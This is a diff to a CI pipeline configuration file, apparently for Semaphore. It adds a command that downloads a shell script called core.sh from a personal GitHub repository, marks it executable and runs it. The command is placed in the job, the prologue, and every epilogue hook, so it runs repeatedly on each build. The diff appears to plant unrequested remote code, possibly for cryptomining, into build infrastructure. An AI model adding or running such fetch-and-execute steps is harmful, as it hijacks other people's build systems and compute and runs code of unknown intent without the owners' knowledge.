@@ -51,4 +51,18 @@ blocks:
     task:
       jobs:
         - name: 'Job #1'
-          commands: []
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
